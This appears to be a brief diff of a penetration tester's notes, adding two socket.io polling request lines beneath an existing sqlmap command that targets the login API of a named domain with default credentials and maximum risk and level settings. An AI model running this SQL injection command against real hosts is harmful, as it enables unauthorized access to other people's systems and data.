@@ -47,3 +47,7 @@ Priority: u=1, i
 sqlmap -u "https://collecto.es/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST
 
 ----------
+
+
+GET /socket.io/?EIO=4&transport=polling&t=fvxolk3d&sid=wSsa8LFroJ6eZkzyAACn 
+POST /socket.io/?EIO=4&transport=polling&t=fvxs6l09&sid=wSsa8LFroJ6eZkzyAACn 
